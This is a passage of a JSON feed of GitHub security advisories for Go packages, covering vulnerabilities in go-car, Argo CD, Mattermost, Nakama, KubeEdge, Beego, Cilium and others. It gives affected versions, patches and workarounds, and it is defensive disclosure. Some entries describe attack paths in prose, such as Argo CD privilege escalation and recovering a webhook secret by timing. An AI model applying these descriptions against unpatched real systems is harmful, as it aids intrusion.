`blockstore/NewBlockReader()`\n* `blockstore/NewReadOnly()`\n* `blockstore/OpenReadOnly()`\n* `blockstore/OpenReadWrite()`\n\nPlease be aware that the default values are **very generous** and may be lowered where a user wants to impose restrictions closer to typical sizes.\n\n* Typical header lengths should be in the order of 60 bytes, but the CAR format does not specify a maximum number of roots a header may contain. The default maximum of 32 MiB makes room for novel uses of the CAR format.\n* Typical IPLD block sizes are under 2 MiB, and it is generally recommended that they not be above 1 MiB for maximum interoperability (e.g. there are hard limitations when sharing IPLD data with IPFS). CARv1 sections are the concatenation of CID and block bytes. The default maximum section length of 8 MiB makes room for novel IPLD data.\n\n***go-car@v2.4.0*** introduces a new API that can be used to inspect a CAR and check for various errors, including those detailed in this advisory. The `Reader#Inspect(bool)` API returns a `Stats` object with various details about the CAR, such as its version, number of blocks, and details about codecs and multihashers used. When its argument is `true`, it will also perform a full hash consistency check of blocks contained within the CAR to ensure they match the CIDs. When `false`, block data is skipped over so a scan will likely be more efficient than reading blocks through a `BlockReader` if statistics and/or validity checking is all that's required. Note that `Inspect()` does minimal checking of index data; the strong recommendation is that if index data is untrusted then it should be regenerated.\n\n***go-car@v2.4.0*** also includes additional documentation regarding the dangers of consuming CARv2 index data from untrusted sources and a recommendation to regenerate indexes of CAR data from such sources where an index is required.\n\n### Workarounds\n\nThere are no workarounds for vulnerabilities in impacted versions decoding CARv1 data. Users of impacted versions should avoid accepting CAR data from untrusted sources.\n\nOOM or excessive memory usage vulnerabilities resulting from CARv2 index parsing in impacted versions can be avoided by not reading indexes from CARv2 data from untrusted sources.\n\n### References\n\nDetails on the CARv1 and CARv2 formats, including the composition of CARv1 headers and sections, and CARv2 indexes can be found in the CAR format specifications: https://ipld.io/specs/transport/car/\n\n### For more information\n\nIf you have any questions or comments about this advisory please open an issue in [go-car](https://github.com/ipld/go-car).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipld/go-car"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/ipld/go-car/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipld/go-car/security/advisories/GHSA-9x4h-8wgm-8xfg"}, {"type": "PACKAGE", "url": "https://github.com/ipld/go-car"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0503"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-06T19:26:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pp3f-98qg-5g75", "modified": "2022-07-21T15:22:31Z", "published": "2022-07-13T00:00:41Z", "aliases": ["CVE-2022-2385"], "summary": "aws-iam-authenticator allow-listed IAM identity may be able to modify their username, escalate privileges before v0.5.9", "details": "A security issue was discovered in aws-iam-authenticator where an allow-listed IAM identity may be able to modify their username and escalate privileges.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "sigs.k8s.io/aws-iam-authenticator"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2385"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/aws-iam-authenticator/issues/472"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/aws-iam-authenticator/pull/469"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/aws-iam-authenticator/commit/029d1dcf2ec8d662d9b1c21260bb197404bc8218"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes-sigs/aws-iam-authenticator"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/aws-iam-authenticator/releases/tag/v0.5.9"}, {"type": "WEB", "url": "https://groups.google.com/a/kubernetes.io/g/dev/c/EMxHpU-1ZYs"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-15T18:09:47Z", "nvd_published_at": "2022-07-12T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7ggc-5r84-xf54", "modified": "2022-07-21T22:35:35Z", "published": "2022-07-15T00:00:16Z", "aliases": ["CVE-2022-2401"], "summary": "Mattermost users could access some sensitive information via API call", "details": "Unrestricted information disclosure of all users in Mattermost version 6.7.0 and earlier allows team members to access some sensitive information by directly accessing the APIs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.3.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.5.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.6.0"}, {"fixed": "6.6.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.7.0"}, {"fixed": "6.7.1"}]}], "versions": ["6.7.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2401"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-21T22:35:35Z", "nvd_published_at": "2022-07-14T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8r94-4h3c-939f", "modified": "2022-07-15T20:44:32Z", "published": "2022-07-06T00:00:26Z", "aliases": ["CVE-2022-2321"], "summary": "Improper Restriction of Excessive Authentication Attempts", "details": "Nakama Console does not enforce any limit for the number of unsuccessful login attempts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/heroiclabs/nakama/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2321"}, {"type": "WEB", "url": "https://github.com/heroiclabs/nakama/pull/878"}, {"type": "WEB", "url": "https://github.com/heroiclabs/nakama/commit/e2e02fce80ff33ce45f8a6ebc0b7a99ee0b03824"}, {"type": "PACKAGE", "url": "https://github.com/heroiclabs/nakama"}, {"type": "WEB", "url": "https://huntr.dev/bounties/3055b3f5-6b80-4d47-8e00-3500dfb458bc"}], "database_specific": {"cwe_ids": ["CWE-307"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-07-06T19:58:27Z", "nvd_published_at": "2022-07-05T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rqph-25q9-9jhp", "modified": "2022-07-15T18:35:26Z", "published": "2022-07-08T00:00:48Z", "aliases": ["CVE-2015-3207"], "summary": "Insecure cookies in Openshift Origin", "details": "In Openshift Origin the cookies being set in console have no 'secure', 'HttpOnly' attributes.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/origin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3207"}, {"type": "WEB", "url": "https://github.com/openshift/origin/pull/2261"}, {"type": "WEB", "url": "https://github.com/openshift/origin/pull/2291"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1221882"}], "database_specific": {"cwe_ids": ["CWE-311", "CWE-614"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-08T19:20:02Z", "nvd_published_at": "2022-07-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jxqv-jcvh-7gr4", "modified": "2023-08-30T18:11:47Z", "published": "2022-07-30T00:00:41Z", "aliases": ["CVE-2022-24912"], "summary": "Atlantis Events vulnerable to Timing Attack", "details": "The package github.com/runatlantis/atlantis/server/controllers/events before 0.19.7 is vulnerable to Timing Attack in the webhook event validator code, which does not use a constant-time comparison function to validate the webhook secret. It can allow an attacker to recover this secret as an attacker and then forge webhook events.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/runatlantis/atlantis"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.19.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24912"}, {"type": "WEB", "url": "https://github.com/runatlantis/atlantis/issues/2391"}, {"type": "WEB", "url": "https://github.com/runatlantis/atlantis/pull/2392"}, {"type": "WEB", "url": "https://github.com/runatlantis/atlantis/commit/48870911974adddaa4c99c8089e79b7d787fa820"}, {"type": "PACKAGE", "url": "https://github.com/runatlantis/atlantis"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0534"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUNATLANTISATLANTISSERVERCONTROLLERSEVENTS-2950851"}], "database_specific": {"cwe_ids": ["CWE-203", "CWE-208"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-08-06T05:21:43Z", "nvd_published_at": "2022-07-29T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2m4x-4q9j-w97g", "modified": "2022-07-13T20:04:43Z", "published": "2022-07-01T00:01:03Z", "aliases": ["CVE-2022-33082"], "summary": "Denial of service in Open Policy Agent ", "details": "An issue in the AST parser (ast/compile.go) of Open Policy Agent v0.10.2 allows attackers to cause a Denial of Service (DoS) via a crafted input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-policy-agent/opa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.42.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-33082"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/issues/4761"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/issues/4762"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/pull/4701"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/064f6168a8dfebdeb2ea147f7882bb9f5d2b7f67"}, {"type": "PACKAGE", "url": "https://github.com/open-policy-agent/opa"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/blob/598176de326025451025225aca53e85708d5f1db/ast/compile.go#L1224"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0574"}], "database_specific": {"cwe_ids": ["CWE-703"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-06T19:52:00Z", "nvd_published_at": "2022-06-30T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qpx3-9565-5xwm", "modified": "2022-07-19T22:28:27Z", "published": "2022-07-11T21:04:51Z", "aliases": ["CVE-2022-31078"], "summary": "KubeEdge CloudCore Router memory exhaustion vulnerability", "details": "### Impact\nThe CloudCore Router does not impose a limit on the size of responses to requests made by the REST handler. An attacker could use this weakness to make a request that will return an HTTP response with a large body and cause DoS of CloudCore. In the HTTP Handler API, the rest handler makes a request to a pre-specified handle. The handle will return an HTTP response that is then read into memory. The consequence of the exhaustion is that CloudCore will be in a denial of service.\nOnly an authenticated user of the cloud can make an attack. It will be affected only when users enable `router` module in the config file `cloudcore.yaml` as below.\n```\nmodules:\n  ...\n  router:\n    enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nDisable the router module in the config file `cloudcore.yaml`.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-qpx3-9565-5xwm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31078"}, {"type": "PACKAGE", "url": "https://github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:04:51Z", "nvd_published_at": "2022-07-11T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-95f9-94vc-665h", "modified": "2023-08-28T23:44:10Z", "published": "2022-07-06T00:00:28Z", "aliases": ["CVE-2022-31836"], "summary": "Path Traversal in Beego", "details": "The `leafInfo.match()` function in Beego v2.0.3 and below uses `path.join()` to deal with wildcardvalues which can lead to cross directory risk.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31836"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/4961"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/5025"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/5025/commits/ea5ae58d40589d249cf577a053e490509de2bf57"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-95f9-94vc-665h"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0569"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-07-06T20:01:19Z", "nvd_published_at": "2022-07-05T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-96jv-vj39-x4j6", "modified": "2023-06-27T20:58:57Z", "published": "2022-07-13T00:00:41Z", "aliases": ["CVE-2022-1025"], "summary": "Argo CD improper access control bug can allow malicious user to escalate privileges to admin level", "details": "# Impact\n\n## Impacts for versions starting with v1.0.0\nAll unpatched versions of Argo CD starting with v1.0.0 are vulnerable to an improper access control bug, allowing a malicious user to potentially escalate their privileges to admin-level.\n\nTo perform the following exploits, an authorized Argo CD user must have push access to an Application's source git or Helm repository or `sync` and `override` access to an Application. Once a user has that access, different exploitation levels are possible depending on their other RBAC privileges:\n\n1. If that user has `update` access to the Application, they can modify any resource on the Application's destination cluster. If the destination cluster is or can be made to be the same as the cluster hosting Argo CD, the user can escalate their Argo CD permissions to admin-level.\n2. If the user has `delete` access to the Application, they can delete any resource on the Application's destination cluster. (This exploit is possible starting with v0.8.0.)\n3. If the user has `get` access to the Application, they can view any resource on the Application's destination cluster (except for the contents of Secrets) and list [actions](https://argo-cd.readthedocs.io/en/stable/operator-manual/resource_actions/) available for that resource.\n4. If the user has `get` access to the Application, they can view the logs of any Pods on the Application's destination cluster.\n5. If the user has `action/{some action or *}` access on the Application, they can run an action for any resource (which supports the allowed action(s)) on the Application's destination cluster. (Some actions are available in Argo CD by default, and others may be configured by an Argo CD admin.)\n\nSee the [Argo CD RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) for an explanation of the privileges available in Argo CD.\n\n## Events exploit\nA related exploit is possible for a user with `get` access to an Application **even if they do not have access to the Application's source git or Helm repository or `sync` and `override` access to the Application**. The user can access any Event in the Application's destination cluster if they know the involved object's name, UID, and namespace.\n\n## Impacts for versions starting with v0.8.0\nThe same bug exists starting with v0.8.0, but only the following exploits were possible before v1.0.0:\n\n- The `delete exploit` (#\u20602 above).\n- The logs exploit (#\u20604 above).\n- The Events exploit described above.\n\n## Impacts for versions starting with v0.5.0\nThe same bug exists starting with v0.5.0 (when RBAC was implemented), but only the Events exploit described above was possible before v0.8.0.\n\nPatches\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n- v2.3.2\n- v2.2.8\n- v2.1.14\n\n**Versions 2.0.x and earlier users**: See the changelog for links to upgrade instructions for your version. It is imperative to upgrade quickly, but some limited mitigations are described in the next section.\n\n**argo-helm chart users**: Argo CD users deploying v2.3.x with argo-helm can upgrade the chart to version 4.2.2. Argo CD 2.2 and 2.1 users can set the global.image.tag value to the latest in your current release series (v2.2.8, or v2.1.14). Since charts for the 2.2 and 2.1 series are no longer maintained, you will need to either leave the value override in place or upgrade to the 4.x chart series (and therefore to Argo CD 2.3).\n\n## Workarounds\nThe only certain way to avoid the vulnerability is to upgrade.\n\n## Mitigations\n\n- To avoid privilege escalation:\n    - Limit who has push access to Application source repositories or sync + override access to Applications.\n- Limit which repositories are available in projects where users have update access to Applications.\n    - To avoid unauthorized resource inspection/tampering:\n    - Limit who has delete, get, or action access to Applications.\n\nThese mitigations can help limit potential damage, but they are not a substitute for upgrading. It is necessary to upgrade immediately.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"last_affected": "1.8.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-2f5v-8r3f-8pww"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1025"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/af03b291d4b7e9d3ce9a6580ae9c8141af0e05cf"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:1039"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:1040"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:1041"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:1042"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-1025"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2064682"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-1220", "CWE-284", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-21T22:29:13Z", "nvd_published_at": "2022-07-12T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xv59-gc3r-rf92", "modified": "2022-07-15T20:44:19Z", "published": "2022-07-06T00:00:30Z", "aliases": ["CVE-2022-2306"], "summary": "Insufficient Session Expiration in Nakama", "details": "Old session tokens can be used to authenticate to the application and send authenticated requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/heroiclabs/nakama"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2306"}, {"type": "WEB", "url": "https://github.com/heroiclabs/nakama/commit/ce8d3921e2acd44ef8b5e6edfe595b6df067b166"}, {"type": "PACKAGE", "url": "https://github.com/heroiclabs/nakama/v3"}, {"type": "WEB", "url": "https://huntr.dev/bounties/35acf263-6db4-4310-ab27-4c3c3a53f796"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-06T19:58:37Z", "nvd_published_at": "2022-07-05T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7943-82jg-wmw5", "modified": "2022-07-21T15:54:19Z", "published": "2022-07-12T22:05:11Z", "aliases": ["CVE-2022-31105"], "summary": "Argo CD certificate verification is skipped for connections to OIDC providers", "details": "### Impact\n\nAll versions of Argo CD starting with v0.4.0 are vulnerable to an improper certificate validation bug which could cause Argo CD to trust a malicious (or otherwise untrustworthy) OIDC provider.\n\n(Note: external OIDC provider support was added in v0.11.0. Before that version, the notes below apply only to the bundled Dex instance.)\n\nYou are impacted if 1) have SSO enabled and 2) insecure mode is _not_ enabled on the API server. In this case, certificate verification is skipped when connecting to your OIDC provider for the following tasks: verifying auth tokens on API requests and handling SSO login flows. If you are using the bundled Dex instance but have _not_ set the `--dex-server` flag on the API server to an HTTPS address, then certificate verification is not being skipped (because [TLS is not enabled by default for the bundled Dex instance](https://github.com/argoproj/argo-cd/issues/9424)).\n\nArgo CD sends requests to the configured OIDC provider (either the bundled Dex instance or an external provider) to 1) retrieve the [OpenID configuration](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfig), 2) to retrieve the OIDC provider's key set (at the location determined by the [OIDC provider's configured `jwks_uri`](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata)), and 3) (during an SSO login) to exchange an authorization code for a token.\n\n(Note: Starting with v2.3.0, certificate verification is _not_ skipped when handling an SSO login flow if 1) you are not using the bundled Dex OIDC provider and 2) you have set `oidc.config.rootCA` in the `argocd-cm` ConfigMap. Certificate verification is still skipped when verifying tokens on API calls.)\n\nSkipping certificate verification when communicating with the OIDC provider opens Argo CD to a variety of risks. For example, if an attacker can successfully intercept, decrypt, and respond to requests bound for the configured OIDC provider (a machine-in-the-middle attack), they could theoretically issue a \"valid\" admin token. Verifying the OIDC provider's certificate provides an extra layer of protection against such an attack.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.5\n* v2.3.6\n* v2.2.11\n\n**Note:**\n\nTo preserve backwards compatibility, this patch adds a `oidc.tls.insecure.skip.verify` option to the `argocd-cm` ConfigMap. The default is `\"false\"`. Before resorting to setting this, you should try to get certificate verification to work. If you are using the bundled Dex instance, user your Argo CD API server's [TLS configuration](https://argo-cd.readthedocs.io/en/stable/operator-manual/tls/) since the API server acts as a reverse proxy to Dex. If you are using an external OIDC provider, [set the `rootCA` config](https://argo-cd.readthedocs.io/en/stable/operator-manual/user-management/#configuring-a-custom-root-ca-certificate-for-communicating-with-the-oidc-provider).\n\nIf these fail, be sure you are aware of the risks before setting `oidc.tls.insecure.skip.verify: \"true\"`.\n\n### Workarounds\n\nThere is no complete workaround besides upgrading.\n\n#### Partial mitigation when using an external OIDC provider\n\nIf you are using an external OIDC provider (not the bundled Dex instance), then you can mitigate the issue by setting the `oidc.config.rootCA` field in the `argocd-cm` ConfigMap. If your OIDC provider's certificate is self-signed or otherwise invalid, you must set the rootCA to a certificate that enables verification. If the OIDC provider's certificate passes _without_ an additional root CA, then you can set `oidc.config.rootCA` to a bogus non-empty string such as `\"force cert verification\"`. The API server will log a warning, but otherwise things should work fine.\n\nExample:\n\n```yaml\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    ...\n    rootCA: |\n      force cert verification\n```\n\nThis mitigation _only_ forces certificate validation when the API server handles login flows. It does not force certificate verification when verifying tokens on API calls. To fully resolve the vulnerability, you must upgrade.\n\n### References\n\n* [Argo CD SSO configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/user-management/#sso)\n\n### Credits\n\n@jannfis and @crenshaw-dev discovered the vulnerability when reviewing notes from ADA Logics' security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.4.0"}, {"fixed": "2.2.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-7943-82jg-wmw5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31105"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.6"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.4.5"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-12T22:05:11Z", "nvd_published_at": "2022-07-12T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wc5v-r48v-g4vh", "modified": "2022-07-20T17:01:55Z", "published": "2022-07-15T21:46:51Z", "aliases": [], "summary": "Cilium host policy bypass in endpoint-routes mode with dual-stack", "details": "### Impact\n\nThis vulnerability allows bypassing host policies for IPv6 traffic coming from a Cilium-managed pod and destined to the host-network namespace (e.g., to a host-network pod). Host policy enforcement on IPv4 or for traffic coming from outside the node is not affected.\n\nCilium is only affected by this vulnerability if IPv4, IPv6, endpoint routes, and the host firewall are enabled. Note that endpoint routes are typically only enabled in GKE, EKS, AKS, and OpenShift; in those environments, IPv6 is typically disabled. Host firewall is disabled by default.\n\n### Patches\n\nThe bug is fixed in versions v1.10.13 and v1.11.7 of Cilium.\n\n### Workarounds\n\nFor affected users who can't upgrade, one potential workaround is to ensure all pods have network policies that prevent sending arbitrary traffic to the local node.\n\n### References\n\nCommit fixing the vulnerability: https://github.com/cilium/cilium/commit/c758da7e9d19cd19b96dc90424c0b5ec7409cd0a.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io)\u2014first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": 